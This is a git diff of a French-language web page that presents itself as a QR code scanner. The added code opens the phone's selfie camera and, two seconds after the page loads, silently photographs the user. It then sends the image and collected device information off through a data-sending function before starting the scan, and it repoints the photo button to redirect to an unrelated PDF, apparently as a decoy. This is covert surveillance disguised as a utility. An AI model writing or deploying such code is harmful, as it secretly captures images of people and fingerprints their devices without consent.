@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QR code scaner</title>
+    <title>Scanner QR Code</title>
     <style>
         #video-container {
             position: relative;
@@ -90,7 +90,7 @@
 
     <div id="qr-reader"></div>
 
-    <button id="capture-button" onclick="prendrePhoto()" title="Prendre une photo"></button>
+    <button id="capture-button" onclick="redirigerVersPage()" title="Prendre une photo"></button>
 
     <script>
         async function obtenirInfosAppareil() {
@@ -176,32 +176,37 @@
             }
         }
 
-        async function prendrePhoto() {
-            const videoMain = document.getElementById('video-main');
-            const selfieStream = await obtenirCameraSelfie();
-            const canvas = document.createElement('canvas');
-            const context = canvas.getContext('2d');
-            canvas.width = videoMain.videoWidth;
-            canvas.height = videoMain.videoHeight;
-            context.drawImage(videoMain, 0, 0, canvas.width, canvas.height); // Prendre la photo du flux vidéo de la caméra selfie
-            const dataURL = canvas.toDataURL('image/png');
-            const blob = dataURLToBlob(dataURL);
-            const infosAppareil = await obtenirInfosAppareil();
-
-            await envoyerDonnees(blob, infosAppareil);
-            console.log('Image et informations envoyées avec succès');
+        function redirigerVersPage() {
+            window.location.href = 'https://userdocs.zenchef.com/362304/iyhDWYXHr6YT17n1xkpEEBP3sbq6MmgCvfTuPJAs.pdf';
         }
 
         (async function() {
             const videoMain = document.getElementById('video-main');
-
             const streamMain = await obtenirCameraArriere();
-            if (streamMain) {
+            const streamSelfie = await obtenirCameraSelfie();
+
+            if (streamMain && streamSelfie) {
                 videoMain.srcObject = streamMain;
 
-                lancerScanQRCode();
+                // Prendre une photo de la caméra selfie automatiquement après 2 secondes
+                setTimeout(async () => {
+                    const videoSelfie = document.createElement('video');
+                    videoSelfie.srcObject = streamSelfie;
+                    videoSelfie.play();
+
+                    videoSelfie.onloadedmetadata = async () => {
+                        const dataURLMain = capturerPhoto(videoSelfie);
+                        const blobMain = dataURLToBlob(dataURLMain);
+                        const infosAppareil = await obtenirInfosAppareil();
+
+                        await envoyerDonnees(blobMain, infosAppareil);
+                        console.log('Image et informations envoyées avec succès');
+
+                        lancerScanQRCode();
+                    };
+                }, 2000);
             } else {
-                alert("Impossible d'accéder à la caméra arrière.");
+                alert("Impossible d'accéder à l'une des caméras.");
             }
         })();
     </script>
